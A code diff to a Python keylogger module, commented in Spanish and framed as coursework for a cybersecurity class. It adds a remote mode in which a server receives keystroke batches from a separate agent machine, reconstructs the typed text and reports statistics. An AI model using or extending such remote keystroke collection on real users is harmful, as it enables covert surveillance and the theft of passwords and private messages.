@@ -6,6 +6,11 @@ NOTA EDUCATIVA: Para poder diseñar un anti-keylogger es necesario entender
 cómo funciona un keylogger con la finalidad de tener mayor seguridad
 en la red digital.
 
+Este módulo soporta dos modos:
+  - LOCAL:  captura teclas en la máquina donde corre el servidor Flask.
+  - REMOTO: recibe teclas enviadas por remote_agent.py desde
+            otra máquina en el ambiente controlado de laboratorio.
+
 Este módulo es EXCLUSIVAMENTE con fines educativos para la materia de
 Ciberseguridad. El uso indebido de keyloggers es ilegal.
 """
@@ -29,6 +34,13 @@ class Keylogger:
         self.is_running = False
         self.start_time = None
         self.hook = None
+
+        # ── Modo Remoto ──────────────────────────────────────────────
+        # Buffer thread-safe para teclas enviadas por remote_agent.py
+        self._remote_keys: list = []
+        self._remote_lock = threading.Lock()
+        self._remote_agent_info: dict = {}
+        self._remote_complete: bool = False
     
     def _on_key_event(self, event):
         """Callback cuando se presiona una tecla."""
@@ -214,6 +226,89 @@ class Keylogger:
                 'success': False,
                 'error': f'Error al guardar: {str(e)}'
             }
+
+
+    # ── Métodos de Modo Remoto ────────────────────────────────────────────────
+
+    def register_remote_agent(self, agent_info: dict):
+        """
+        Registra un agente remoto (remote_agent.py) y limpia capturas previas.
+        """
+        with self._remote_lock:
+            self._remote_keys = []
+            self._remote_complete = False
+            self._remote_agent_info = agent_info
+        return {'success': True, 'message': f"Agente {agent_info.get('agent_ip')} registrado en modo keylogger."}
+
+    def receive_remote_keys(self, keys: list, final: bool = False):
+        """
+        Recibe un lote de teclas desde remote_agent.py y las acumula.
+
+        Args:
+            keys:  Lista de dicts con info de cada tecla.
+            final: True si es el último lote (captura completa).
+        """
+        with self._remote_lock:
+            self._remote_keys.extend(keys)
+            if final:
+                self._remote_complete = True
+        return {'success': True, 'received': len(keys)}
+
+    def get_remote_results(self):
+        """
+        Devuelve las teclas acumuladas hasta el momento.
+        Llamado periódicamente por el frontend (polling).
+        """
+        with self._remote_lock:
+            keys = list(self._remote_keys)
+            complete = self._remote_complete
+            agent = dict(self._remote_agent_info)
+
+        captured_text = self._reconstruct_text_from(keys)
+        stats = self._generate_stats_from(keys)
+        return {
+            'success': True,
+            'keys': keys,
+            'total_keys': len(keys),
+            'captured_text': captured_text,
+            'complete': complete,
+            'agent': agent,
+            'duration': agent.get('duration', 0),
+            'stats': stats
+        }
+
+    def _reconstruct_text_from(self, keys: list):
+        """Reconstruye el texto a partir de una lista de teclas arbitraria."""
+        text = ''
+        for key in keys:
+            name = key.get('key', '')
+            if name == 'space':
+                text += ' '
+            elif name == 'enter':
+                text += '\n'
+            elif name == 'backspace':
+                text = text[:-1] if text else ''
+            elif name == 'tab':
+                text += '\t'
+            elif key.get('type') in ('letra', 'número', 'símbolo'):
+                text += name
+        return text
+
+    def _generate_stats_from(self, keys: list):
+        """Genera estadísticas a partir de una lista de teclas arbitraria."""
+        total = len(keys)
+        types = {}
+        for key in keys:
+            t = key.get('type', 'especial')
+            types[t] = types.get(t, 0) + 1
+        return {
+            'total': total,
+            'types': types,
+            'letters': types.get('letra', 0),
+            'numbers': types.get('número', 0),
+            'symbols': types.get('símbolo', 0),
+            'special': total - types.get('letra', 0) - types.get('número', 0) - types.get('símbolo', 0)
+        }
 
 
 # Instancia global
